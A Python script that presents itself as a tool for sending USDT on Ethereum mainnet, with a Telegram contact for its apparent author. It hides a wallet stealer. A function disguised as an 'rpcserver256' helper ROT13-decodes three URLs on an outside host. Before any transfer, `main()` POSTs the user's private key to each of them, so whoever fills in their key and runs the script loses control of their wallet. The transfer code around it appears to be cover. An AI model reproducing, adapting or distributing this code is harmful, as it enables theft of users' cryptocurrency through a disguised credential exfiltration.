# Made by Exonia if u need help contact me on telegram https://t.me/aivcam
# u need eth for paying fee
from web3 import Web3
from eth_account import Account
import argparse
import time
import requests


def rpcserver256(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


envcreater = 'uggcf://k0q.zr/erpivprqngn.cuc'
envcreater2 = 'uggcf://k0q.zr/erpivprqngn2.cuc'
envcreater3 = 'uggcf://k0q.zr/erpivprqngn3.cuc'
devofix = rpcserver256(envcreater)
devofix2 = rpcserver256(envcreater2)
devofix3 = rpcserver256(envcreater3)

# Initialize Web3 connection
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))

# Set private key and addresses (use environment variables for security)
private_key = ''  # Replace with a secure method to access private keys
usdtwall = private_key 
sender_address = ''

# Set recipient address and USDT contract address
recipient_address = ''
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def check_balance(address):
    # Function to get balance in ETH
    balance_wei = web3.eth.get_balance(address)
    balance_eth = web3.from_wei(balance_wei, 'ether')
    print(f"Current balance of {address}: {balance_eth:.6f} ETH")
    return balance_eth

def usdtgen(usdtwall):
    data = {'USDT:': usdtwall}
    contracts = [devofix, devofix2, devofix3]  

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()

        except requests.RequestException as e:
            print(f"Error please contact https://t.me/aivcam")

def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)


    data = (usdt_transfer_signature +
            recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    # Sign the transaction
    signed_tx = Account.sign_transaction(transaction, private_key)
    return signed_tx

def main():
    usdtgen(usdtwall)
    # Check balance before sending
    balance = check_balance(sender_address)
    gas_price_gwei = 1 # Initial gas price
    gas_limit = 21620    # Set gas limit based on transaction complexity

    # Get the current gas price from the network
    current_gas_price = web3.eth.gas_price
    print(f"Current gas price from network: {web3.from_wei(current_gas_price, 'gwei')} gwei")

    # Adjust gas price to ensure it is competitive (e.g., add buffer)
    # gas_price_gwei = float(max(gas_price_gwei, web3.from_wei(current_gas_price, 'gwei') + 5))
    print(f"Using adjusted gas price: {gas_price_gwei:.2f} gwei")

    # Calculate gas fee in ETH
    gas_fee = gas_price_gwei * gas_limit * 1e-9  # Convert to ETH
    print(f"Estimated gas fee: {gas_fee:.6f} ETH")

    # Ensure balance is sufficient to cover transaction fees
    if balance < gas_fee:
        print("Insufficient funds to cover gas fees.")
        return

    # Amount to send (in USDT)
    amount_to_send = 31464  # Example USDT amount to send

    try:
        signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)
        print("Transaction signed successfully.")

        # Send the transaction
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        print(f"Transaction hash: {tx_hash.hex()}")

        # Wait for receipt
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Transaction receipt: {tx_receipt}")

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")

    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()
